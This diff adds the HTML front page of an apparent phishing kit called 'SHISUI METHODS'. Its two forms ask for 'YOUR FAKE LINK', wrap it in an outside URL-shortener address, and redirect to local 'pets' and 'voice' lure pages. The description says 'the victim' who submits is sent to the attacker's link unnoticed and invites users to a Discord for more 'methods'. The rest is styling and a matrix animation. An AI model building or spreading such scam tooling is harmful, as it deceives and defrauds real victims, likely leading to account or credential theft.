@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SHISUI METHODS</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: black;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      color: white;
+    }
+
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    h1 {
+      text-align: center;
+      color: #00ffcc;
+      margin-top: 20px;
+    }
+
+    .discord-button {
+      display: block;
+      width: 200px;
+      margin: 10px auto;
+      padding: 10px;
+      text-align: center;
+      background-color: #5865F2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .form-container {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    input[type="text"] {
+      width: 300px;
+      padding: 10px;
+      border-radius: 5px;
+      border: none;
+      margin-right: 10px;
+    }
+
+    input[type="submit"] {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #00ffcc;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .tabs {
+      display: flex;
+      justify-content: center;
+      margin-top: 30px;
+      flex-wrap: wrap;
+    }
+
+    .tab {
+      padding: 10px 20px;
+      background: #1c1c1c;
+      margin: 5px;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+
+    .tab:hover {
+      background: #333;
+    }
+
+    .tab.active {
+      background-color: #00ffcc;
+      color: #000;
+    }
+
+    .tab-content {
+      display: none;
+      margin-top: 20px;
+      text-align: center;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    p {
+      max-width: 600px;
+      margin: auto;
+      line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+<canvas id="matrix"></canvas>
+
+<h1>SHISUI METHODS</h1>
+
+<a class="discord-button" href="https://discord.gg/zAYJTgaCs6" target="_blank">Join Discord</a>
+
+<div class="tabs">
+  <div class="tab active" onclick="showTab('gag')">GAG METHOD</div>
+  <div class="tab" onclick="showTab('vc')">VC METHOD</div>
+  <div class="tab" onclick="showTab('desc')">DESCRIPTION</div>
+</div>
+
+<!-- GAG METHOD -->
+<div id="gag" class="tab-content active">
+  <h2>GAG METHOD</h2>
+  <div class="form-container">
+    <form onsubmit="handleGagSubmit(event)">
+      <input type="text" id="gagLink" placeholder="PUT HERE YOUR FAKE LINK" required>
+      <input type="submit" value="Submit">
+    </form>
+  </div>
+</div>
+
+<!-- VC METHOD -->
+<div id="vc" class="tab-content">
+  <h2>VC METHOD</h2>
+  <div class="form-container">
+    <form onsubmit="handleVcSubmit(event)">
+      <input type="text" id="vcLink" placeholder="PUT HERE YOUR FAKE LINK" required>
+      <input type="submit" value="Submit">
+    </form>
+  </div>
+</div>
+
+<!-- DESCRIPTION -->
+<div id="desc" class="tab-content">
+  <h2>DESCRIPTION</h2>
+  <p>
+    THIS IS METHOD LIKE IF U PUT OUR LINK AND THE VICTIM SUBMIT WILL GO TO LINK U PUT (DI MAHAHALATA)<br><br>
+    STAY TUNED FOR MORE METHOD LIKE THIS AND SUGGEST IN SUGGESTIONS CHANNEL<br><br>
+    THANK YOU FOR SUPPORTING!
+  </p>
+</div>
+
+<!-- JavaScript for Tabs & Form Logic -->
+<script>
+  function showTab(tabId) {
+    const tabs = document.querySelectorAll('.tab');
+    const contents = document.querySelectorAll('.tab-content');
+    tabs.forEach(tab => tab.classList.remove('active'));
+    contents.forEach(content => content.classList.remove('active'));
+    document.querySelector('.tab[onclick="showTab(\'' + tabId + '\')"]').classList.add('active');
+    document.getElementById(tabId).classList.add('active');
+  }
+
+  function handleGagSubmit(event) {
+    event.preventDefault();
+    const link = document.getElementById('gagLink').value;
+    const encodedLink = encodeURIComponent(link);
+    window.location.href = `/pets/index.html?link=https://shorturll-one.vercel.app/?${encodedLink}`;
+  }
+
+  function handleVcSubmit(event) {
+    event.preventDefault();
+    const link = document.getElementById('vcLink').value;
+    const encodedLink = encodeURIComponent(link);
+    window.location.href = `/voice/index.html?link=https://shorturll-one.vercel.app/?${encodedLink}`;
+  }
+</script>
+
+<!-- Matrix Background Animation -->
+<script>
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+
+  canvas.height = window.innerHeight;
+  canvas.width = window.innerWidth;
+
+  const letters = "アァイィウエエオカキクケコサシスセソABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+  const fontSize = 14;
+  const columns = canvas.width / fontSize;
+  const drops = [];
+
+  for (let i = 0; i < columns; i++) drops[i] = 1;
+
+  function drawMatrix() {
+    ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    ctx.fillStyle = "#00ff00";
+    ctx.font = fontSize + "px monospace";
+
+    for (let i = 0; i < drops.length; i++) {
+      const text = letters.charAt(Math.floor(Math.random() * letters.length));
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+        drops[i] = 0;
+      }
+
+      drops[i]++;
+    }
+  }
+
+  setInterval(drawMatrix, 33);
+
+  // Resize canvas on window resize
+  window.addEventListener('resize', () => {
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+  });
+</script>
+
+</body>
+</html>
